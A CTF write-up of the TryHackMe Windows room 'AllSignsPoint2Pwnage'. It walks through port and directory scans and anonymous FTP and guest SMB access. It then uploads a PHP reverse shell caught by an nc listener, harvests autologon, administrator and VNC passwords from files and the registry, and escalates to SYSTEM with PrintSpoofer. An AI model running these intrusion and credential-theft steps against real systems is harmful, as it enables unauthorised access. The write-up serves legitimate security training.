---
layout: post
title: "THM AllSignsPoint2Pwnage Writeup"
date: "2021-04-16"
categories: tryhackme
---
**Name**: AllSignsPoint2Pwnage

**Location**: [TryHackMe](https://tryhackme.com/room/allsignspoint2pwnage)

**Description**: A room that contains a rushed Windows based Digital Sign system. Can you breach it?

**Difficulty**: No Rating

## Network Enumeration
First of all, let's start our initial enumeration of our target using `nmap`.

```sh
# Nmap 7.91 scan initiated Fri Apr 16 21:45:20 2021 as: nmap -sC -sV -oN initial -vv 10.10.44.132
Increasing send delay for 10.10.44.132 from 0 to 5 due to 46 out of 152 dropped probes since last increase.
Nmap scan report for 10.10.44.132
Host is up, received syn-ack (0.40s latency).
Scanned at 2021-04-16 21:45:20 PST for 156s
Not shown: 992 closed ports
Reason: 992 conn-refused
PORT     STATE SERVICE        REASON  VERSION
21/tcp   open  ftp            syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_11-14-20  04:26PM                  173 notice.txt
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http           syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_http-title: Simple Slide Show
135/tcp  open  msrpc          syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn    syn-ack Microsoft Windows netbios-ssn
443/tcp  open  ssl/http       syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_http-title: Simple Slide Show
| ssl-cert: Subject: commonName=localhost
| [CLIPPED]
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?  syn-ack
3389/tcp open  ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=DESKTOP-997GG7D
| [CLIPPED]
|_ssl-date: 2021-04-16T13:47:48+00:00; +1s from scanner time.
5900/tcp open  vnc            syn-ack VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     Ultra (17)
|_    VNC Authentication (2)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 16 21:47:56 2021 -- 1 IP address (1 host up) scanned in 155.74 seconds
```

I clipped some of the NMAP result so it won't takeover the whole page but we noticed that we have a couple of ports that we want to check next.

We also noticed that port `80` is open and is running an Apache server, let's check that first.

## Web Enumeration
The website has a very basic web page with only multiple images, nothing much interesting here.

We want to know every directory in the target website so let's go run GoBuster.

```sh
$ gobuster dir -u http://10.10.44.132/ -w /usr/share/wordlists/dirb/common.txt

[CLIPPED]
===============================================================
2021/04/17 00:22:09 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.hta (Status: 403)
/aux (Status: 403)
/cgi-bin/ (Status: 403)
/com1 (Status: 403)
/com2 (Status: 403)
/com3 (Status: 403)
/con (Status: 403)
/dashboard (Status: 301)
/favicon.ico (Status: 200)
/images (Status: 301)
/Images (Status: 301)
/img (Status: 301)
/index.html (Status: 200)
/licenses (Status: 403)
/lpt1 (Status: 403)
/lpt2 (Status: 403)
/nul (Status: 403)
/phpmyadmin (Status: 403)
/prn (Status: 403)
/server-status (Status: 403)
/server-info (Status: 403)
/webalizer (Status: 403)
===============================================================
2021/04/17 00:25:35 Finished
===============================================================

```

Now that's a lot of hidden directories, and also we had some very interesting ones but most of them returns HTTP 403 Forbidden. Let's ignore those and focus on `/images`

Looking at the web page's source code, we noticed there's a JS which do a couple of things:

1.) Fetches the list of images from `content.php`. Visiting this page, we see a very basic JSON.

2.) Loops through the images and append each image name to the `src` attribute of `#image` div. We can see here that the directory `/images/` is also being used.

```js
...
<script>
// Lets Get the URL of the host
var server = location.protocol + "//" + location.host;
// Lets use the server URL to locate content.php that will give us the JSON string
$.get( server + '/content.php',function(data){
	// Let get the legnth of the string minus the dummy entry
	mc = data.length;
	// Out loop time will be 10s x the number of images
	loop = ( mc - 1 ) * 10000;
	// Set the reload timeout 
	setTimeout(function() { location.reload() }, loop );
	// Loop through the images
	for (i = 0; i < data.length; i++) {
		changeImage(data[i].image,i);
	}
},'json');
// This will display the images at intervals
async function changeImage(i,t){
	o = t * 10000;
	await setTimeout(function(){$('#image').attr('src','/images/' + i )}, o) ;
}
</script>
```

Let's move forward with our enumeration.

## FTP Enumeration
Our earlier NMAP results shows that port `21` is open and running the Microsoft FTPD service.

It was also pointed out that Anonymous login is allowed, so let's do just that.

```sh
$ ftp 10.10.44.132

Connected to 10.10.44.132.
220 Microsoft FTP Service
Name (10.10.44.132:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
11-14-20  04:26PM                  173 notice.txt
226 Transfer complete.
ftp> get notice.txt
local: notice.txt remote: notice.txt
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
173 bytes received in 0.38 secs (0.4443 kB/s)
```

We successfully logged in as Anonymous on the FTP service, going through the contents we can see there's a notice.txt and I went ahead to download that on my attack machine using `get`.

Let's look into the content of `notice.txt`

```sh
$ cat notice.txt    
NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management 
of images.

- Dev Team 
```

The contents of this file speaks about Windows File Share and the `/images/` directory we knew beforehand. A clue for SMB? Anyhow, let's move on with our enumeration.

## SMB Enumeration
Ports `139` and `445` also appears to be open which is the usual port for Server Message Block (SMB). Let's go enumerate this SMB.

```sh
$ smbmap -u guest -p "" -H 10.10.44.132

[+] IP: 10.10.44.132:445       Name: 10.10.44.132                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        images$                                                 READ, WRITE
        Installs$                                               NO ACCESS
        IPC$                                                    READ ONLY       Remote IPC
        Users                                                   READ ONLY
```

Guest login was a lucky guess. Looking into the results we noticed that we have READ and WRITE access to a share named `images$`.

This is also a hidden directory and also the sharename that the `notice.txt` from our previous enumeration speaks about.

Now let's login and see the contents of this share.

```sh
smbclient //10.10.44.132/images$

Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 27 02:19:19 2021
  ..                                  D        0  Wed Jan 27 02:19:19 2021
  internet-1028794_1920.jpg           A   134193  Mon Jan 11 05:52:24 2021
  man-1459246_1280.png                A   363259  Mon Jan 11 05:50:49 2021
  monitor-1307227_1920.jpg            A   691570  Mon Jan 11 05:50:29 2021
  neon-sign-4716257_1920.png          A  1461192  Mon Jan 11 05:53:59 2021

                10861311 blocks of size 4096. 4126378 blocks available
smb: \>
```

Looking through the content of this SMB share, we noticed that these are the images that `content.php` is displaying.

Now let's move forward to exploitation and setting a foothold on this box.

## Setting a foothold
Knowing we have write access on `images$` share, let's go ahead and upload a reverse shell - I used the one from [Ivan Sincek](https://github.com/ivan-sincek/php-reverse-shell).

```sh
smb: \> put shell.php
putting file shell.php as \shell.php (3.7 kb/s) (average 3.7 kb/s)
```

Now that we have our reverse shell uploaded, let's go ahead and activate it. Make sure you have an active listener beforehand.

Go back to the website and append `/images/shell.php` on your URL, this should open a connection back to your listener.

```sh
$ rlwrap nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.4.32.195] from (UNKNOWN) [10.10.151.228] 49969
SOCKET: Shell has connected! PID: 1148
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\> whoami
desktop-997gg7d\sign

C:\> whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Success 🎉! Further enumeration, we know that we are user `sign` and that we have the `SeImpersonatePrivilege` privilege which can be a vector for potential privilege escalation later.

## Retrieving the User Flag
Now that we have a shell and we know who we are. Let's proceed and get our user flag. For CTF boxes such as this, they are usually stored on the user's desktop.

```sh
C:\> cd C:\Users\sign\Desktop

C:\Users\sign\Desktop> dir
Volume in drive C has no label.
Volume Serial Number is 481F-824B

Directory of C:\Users\sign\Desktop

26/01/2021  19:28    <DIR>          .
26/01/2021  19:28    <DIR>          ..
14/11/2020  14:15             1,446 Microsoft Edge.lnk
14/11/2020  15:32                52 user_flag.txt
               2 File(s)          1,498 bytes
               2 Dir(s)  16,891,207,680 bytes free

C:\Users\sign\Desktop> more user_flag.txt
thm{REDACTED}
```

## Retrieve User Password
Before moving forward with Privilege Esclation, we have some tasks we need to accomplish first. Looking into the hint provided by this room, we know that this user is automatically logged on.

That being said, let's check the registry for the default password.

```sh
C:\Users\sign\Desktop> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

    [CLIPPED]
    AutoLogonSID    REG_SZ    S-1-5-21-201290883-77286733-747258586-1001
    LastUsedUsername    REG_SZ    .\sign
    DefaultUsername    REG_SZ    .\sign
    DefaultPassword    REG_SZ    REDACTED
    AutoAdminLogon    REG_DWORD    0x1
    ARSOUserConsent    REG_DWORD    0x0

    [CLIPPED]
```

## Retrieve Administrator and VNC Password
This part took me awhile to figure it out, until I realized an interesting directory in the `C:\` directory.

```sh
C:\> cd Installs

C:\Installs> dir

Volume in drive C has no label.
Volume Serial Number is 481F-824B

Directory of C:\Installs

14/11/2020  16:37    <DIR>          .
14/11/2020  16:37    <DIR>          ..
14/11/2020  16:40               548 Install Guide.txt
14/11/2020  16:19               800 Install_www_and_deploy.bat
14/11/2020  14:59           339,096 PsExec.exe
14/11/2020  15:28    <DIR>          simepleslide
14/11/2020  15:01               182 simepleslide.zip
14/11/2020  16:14               147 startup.bat
14/11/2020  15:43             1,292 ultravnc.ini
14/11/2020  15:00         3,129,968 UltraVNC_1_2_40_X64_Setup.exe
14/11/2020  14:59       162,450,672 xampp-windows-x64-7.4.11-0-VC15-installer.exe
               8 File(s)    165,922,705 bytes
               3 Dir(s)  16,913,813,504 bytes free
```

We have some interesting files in this directory, but I want to focus on two files which are `Install_www_and_deploy.bat` and `ultravnc.ini`. Mainly because its a `.bat` and `.ini` file which might contain sensitive information.

```sh
C:\Installs> more Install_www_and_deploy.bat

@echo off
REM Shop Sign Install Script 
cd C:\Installs
psexec -accepteula -nobanner -u administrator -p REDACTED xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
mkdir C:\xampp\htdocs\images
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
pause
```

We've got the Administrator password! Now for the VNC password.

```sh
C:\Installs> more ultravnc.ini

[ultravnc]
passwd=B3A8F2D8BEA2F1FA70
passwd2=5AB2CDC0BADCAF13F1
[CLIPPED]
```

This doesn't look like the password isn't it? After a couple of searches and looking at the hints provided by the room. We came into the conclusion that this is an encrypted password which we need to decrypt.

Following the advice of our room hint, I went ahead and downloaded the [VNC Password Recovery Tool](http://aluigi.altervista.org/pwdrec.htm) on my attack machine.

The tool is contained in a `.zip` file, upon unzipping we noticed the tool is a `.exe` file. Since I am using Kali as my attack machine, I have to use Wine to run the tool.

```sh
$ wine vncpwd.exe B3A8F2D8BEA2F1FA70

*VNC password decoder 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- your input password seems in hex format (or longer than 8 chars)

  Password:   REDACTED

  Press RETURN to exit
```

Now that's done, let's move forward with our Privilege Escalation.

## Priv Esc to Administrator and retrieve the Root Flag
If you still remember, we have the `SeImpersonatePrivilege` privilege which we will use as our attack vector for priv esc.

Let's go back to our SMB instance (open another Terminal, don't exit your shell!) and upload an exploit to escalate our privileges.

```sh
$ smbclient //10.10.44.132/images$

Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 27 02:19:19 2021
  ..                                  D        0  Wed Jan 27 02:19:19 2021
  internet-1028794_1920.jpg           A   134193  Mon Jan 11 05:52:24 2021
  man-1459246_1280.png                A   363259  Mon Jan 11 05:50:49 2021
  monitor-1307227_1920.jpg            A   691570  Mon Jan 11 05:50:29 2021
  neon-sign-4716257_1920.png          A  1461192  Mon Jan 11 05:53:59 2021

                10861311 blocks of size 4096. 4126378 blocks available
smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (4.7 kb/s) (average 4.7 kb/s)
```

Now that we have PrintSpoofer uploaded, let's go back to our shell and execute this exploit.

```sh
C:\Installs> cd C:\xampp\htdocs\images

C:\xampp\htdocs\images> dir

Volume in drive C has no label.
Volume Serial Number is 481F-824B

Directory of C:\xampp\htdocs\images

16/04/2021  18:48    <DIR>          .
16/04/2021  18:48    <DIR>          ..
10/01/2021  22:52           134,193 internet-1028794_1920.jpg
10/01/2021  22:50           363,259 man-1459246_1280.png
10/01/2021  22:50           691,570 monitor-1307227_1920.jpg
10/01/2021  22:53         1,461,192 neon-sign-4716257_1920.png
16/04/2021  18:48            27,136 PrintSpoofer64.exe
16/04/2021  18:47             9,142 shell.php
               6 File(s)      2,686,492 bytes
               2 Dir(s)  16,013,606,912 bytes free

C:\xampp\htdocs\images> PrintSpoofer64.exe -i -c cmd

[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

We have successfully escalated our privileges! Now let's get that flag. It's located on the Desktop of our user.

```sh
C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
Volume in drive C has no label.
Volume Serial Number is 481F-824B

Directory of C:\Users\Administrator\Desktop

11/14/2020  03:32 PM    <DIR>          .
11/14/2020  03:32 PM    <DIR>          ..
11/14/2020  03:31 PM                54 admin_flag.txt
               1 File(s)             54 bytes
               2 Dir(s)  16,967,950,336 bytes free

C:\Users\Administrator\Desktop> more admin_flag.txt
thm{REDACTED}
```
